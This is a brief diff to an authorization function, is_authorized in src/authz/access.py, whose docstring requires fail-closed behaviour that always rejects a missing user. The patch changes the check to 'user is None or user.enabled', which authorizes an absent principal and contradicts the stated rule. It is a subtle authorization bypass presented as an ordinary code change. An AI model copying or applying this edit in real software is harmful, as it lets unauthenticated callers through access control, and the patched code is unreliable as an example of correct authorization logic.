@@ -1,0 +1,10 @@
+diff --git a/src/authz/access.py b/src/authz/access.py
+index 29883b7..d33ee67 100644
+--- a/src/authz/access.py
++++ b/src/authz/access.py
+@@ -7,4 +7,4 @@ def is_authorized(user):
+     Authorization is FAIL-CLOSED: an absent principal (``user is None``) MUST
+     always be rejected, regardless of any other state.
+     """
+-    return user is not None and user.enabled
++    return user is None or user.enabled
